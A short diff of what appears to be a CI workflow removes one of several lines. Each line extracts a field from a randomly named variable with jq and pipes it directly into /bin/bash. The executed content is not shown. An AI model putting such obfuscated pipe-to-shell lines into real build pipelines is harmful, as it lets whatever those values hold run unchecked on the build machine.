@@ -26,7 +26,6 @@ jobs:
           echo $izpt75023 | jq -r .h2304 | /bin/bash
           printf '%s' "$dn1" | jq -r .jdanc58430 | /bin/bash
           printf '%s' "$zxoho0521" | jq -r .rg16 | /bin/bash
-          printf '%s' "$as1745" | jq -r .inatx8203 | /bin/bash
           printf '%s' "$tluo0" | jq -r .op9 | /bin/bash
           printf '%s' "$obho4238" | jq -r .xf179 | /bin/bash
 
